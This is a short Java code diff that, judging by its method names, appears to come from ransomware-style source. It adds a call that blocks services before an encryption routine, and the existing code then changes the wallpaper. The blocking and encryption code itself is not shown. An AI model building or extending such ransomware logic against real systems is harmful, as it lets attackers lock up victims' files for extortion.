@@ -7,6 +7,8 @@ public class Main {
         Scanner sc = new Scanner(System.in);
         String verify = sc.nextLine();
         if (verify.equals("run")) {
+            System.out.println("Service Block");
+            ServiceBlock.blockAll();
             System.out.println("Encrypting...");
             Encrypt.runEncryption();
             System.out.println("Change Wallpaper");
